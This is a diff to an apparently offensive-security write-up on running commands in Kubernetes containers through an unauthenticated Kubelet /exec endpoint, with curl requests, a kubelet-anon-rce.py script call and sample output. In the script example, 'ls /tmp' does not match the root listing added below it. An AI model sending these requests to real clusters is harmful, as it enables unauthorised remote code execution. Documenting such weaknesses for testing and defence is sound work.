@@ -104,12 +104,12 @@ A template request to run a command in a container is shown below:
 ```
 $ curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} \
   -d 'input=1' -d 'output=1' -d 'tty=1'                               \
-  -d 'command=ls' -d 'command=/tmp'
+  -d 'command=ls' -d 'command=/'
 ```
 
 It should be noted that the `command` is passed as an array (split by spaces) and that the above is a GET request.
 
-Target `{namespace}`, `{pod}` and `{container}` values can be obtained from the `/pods` endpoint as shown in the previous section. For example, to run `ls /tmp` in the `tiller` container the request would be:
+Target `{namespace}`, `{pod}` and `{container}` values can be obtained from the `/pods` endpoint as shown in the previous section. For example, to run `ls /` in the `tiller` container the request would be:
 
 ```
 $ curl -Gks https://worker:10250/exec/kube-system/tiller-797d1b1234-gb6qt/tiller \
@@ -131,7 +131,8 @@ $ python3 kubelet-anon-rce.py           \
           --container tiller            \
           --exec "ls /tmp"
 
-...
+bin  etc   lib	  mnt  proc  run   selinux  sys  usr
+dev  home  lib64  opt  root  sbin  srv	    tmp  var
 ```
 
 ## Obtaining Service Account Tokens
